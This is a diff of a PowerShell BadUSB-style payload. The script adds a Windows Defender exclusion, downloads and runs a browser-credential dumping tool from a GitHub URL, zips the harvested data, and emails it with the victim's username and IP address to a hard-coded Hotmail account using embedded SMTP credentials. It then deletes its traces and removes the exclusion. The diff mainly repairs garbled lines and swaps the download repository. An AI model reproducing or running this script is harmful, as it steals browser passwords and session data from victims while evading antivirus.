@@ -7,11 +7,11 @@ Add-MpPreference -ExclusionPath "$env:appdata"
 mkdir "$env:appdata\dump"
 Set-Location "$env:appdata\dump"
 #Downloading and executing hackbrowser.exe
-Invoke-WebRequest -Uri "https://github.com/Eduardo00073/badusb/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
+Invoke-WebRequest -Uri "https://github.com/david26099/allc-scripts/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
 ./hb.exe
 Start-Sleep -Seconds 6
 Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
-#Creating A Zip Archive dum s
+#Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
 #Mailing the output you will need to enable less secure app access on your google account for this to work
@@ -20,12 +20,9 @@ $smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", 587)
 $smtp.Credentials = New-Object System.Net.NetworkCredential("badusb_delta@hotmail.com", "usb_delta@hotm");
 $smtp.EnableSsl = $true
 $Message.From = "badusb_delta@hotmail.com"
-$Ms
-ssage.To.Add("badusb_delta@hotmail.com")stop
-$ip = Invoke-RestMethod "myexternalip.com/ra;]
-vw"
-$
-M0essage.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
+$Message.To.Add("badusb_delta@hotmail.com")
+$ip = Invoke-RestMethod "myexternalip.com/raw"
+$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
 $Message.Body = $ComputerName
 $files=Get-ChildItem 
@@ -38,5 +35,3 @@ Start-Sleep -Seconds 6
 cd "$env:appdata"
 Remove-Item -Path "$env:appdata\dump" -Force -Recurse
 Remove-MpPreference -ExclusionPath "$env:appdata"
-
-
